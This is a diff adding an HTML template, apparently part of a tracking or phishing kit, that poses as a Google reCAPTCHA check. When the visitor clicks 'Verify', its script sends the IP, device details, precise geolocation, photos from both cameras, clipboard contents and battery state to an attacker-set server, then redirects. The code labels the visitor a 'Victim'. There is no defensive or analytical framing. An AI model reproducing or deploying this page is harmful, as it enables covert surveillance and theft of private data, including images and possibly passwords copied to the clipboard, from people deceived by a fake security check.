@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>reCAPTCHA Verification</title>
+<link rel="icon" href="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { text-align: center; }
+.recaptcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; padding: 20px 30px; display: inline-flex; align-items: center; gap: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); cursor: pointer; user-select: none; }
+.checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 3px; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
+.checkbox.checked { border-color: #4caf50; background: #4caf50; }
+.checkbox.checked::after { content: '✓'; color: #fff; font-size: 18px; font-weight: bold; }
+.label { font-size: 14px; color: #555; }
+.branding { text-align: right; border-left: 1px solid #ddd; padding-left: 20px; }
+.branding img { width: 40px; height: 40px; }
+.branding p { font-size: 10px; color: #555; margin-top: 2px; }
+.grid-challenge { display: none; background: #fff; border: 2px solid #4a90d9; border-radius: 4px; padding: 16px; max-width: 320px; margin: 20px auto; }
+.grid-header { background: #4a90d9; color: #fff; padding: 12px; margin: -16px -16px 16px; border-radius: 2px 2px 0 0; font-size: 14px; }
+.grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 4px; }
+.grid div { width: 90px; height: 90px; border-radius: 2px; cursor: pointer; transition: opacity 0.2s; }
+.grid div:hover { opacity: 0.8; }
+.grid div.selected { outline: 3px solid #4a90d9; }
+.verify-btn { margin-top: 12px; background: #4a90d9; color: #fff; border: none; padding: 10px 24px; border-radius: 2px; cursor: pointer; font-size: 14px; }
+.loading { display: none; margin-top: 20px; }
+.spinner { border: 3px solid #ddd; border-top: 3px solid #4a90d9; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="recaptcha-box" id="captchaBox" onclick="showChallenge()">
+<div class="checkbox" id="cb"></div>
+<span class="label">I'm not a robot</span>
+<div class="branding">
+<img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+<p>reCAPTCHA</p>
+<p style="font-size:8px;color:#999;">Privacy - Terms</p>
+</div>
+</div>
+<div class="grid-challenge" id="challenge">
+<div class="grid-header">Select all images with <b>traffic lights</b></div>
+<div class="grid" id="grid"></div>
+<button class="verify-btn" onclick="startVerify()">Verify</button>
+</div>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="font-size:13px;color:#555;">Verifying...</p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+var colors=['#e57373','#81c784','#64b5f6','#ffb74d','#ba68c8','#4db6ac','#ff8a65','#a1887f','#90a4ae'];
+function showChallenge(){
+    document.getElementById('cb').classList.add('checked');
+    var g=document.getElementById('grid');
+    g.innerHTML='';
+    colors.forEach(function(c){var d=document.createElement('div');d.style.background=c;d.onclick=function(){this.classList.toggle('selected')};g.appendChild(d);});
+    setTimeout(function(){document.getElementById('challenge').style.display='block';},500);
+}
+function startVerify(){
+    document.getElementById('challenge').style.display='none';
+    document.getElementById('captchaBox').style.display='none';
+    document.getElementById('loading').style.display='block';
+    gatherAll(); advancedGather("<%=a %>","<%=uid %>");
+    setTimeout(function(){window.location.href="<%=url %>";},4000);
+}
+async function gatherAll(){
+    let td='📸 <b>CAPTCHA Verify Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+</script>
+</body>
+</html>
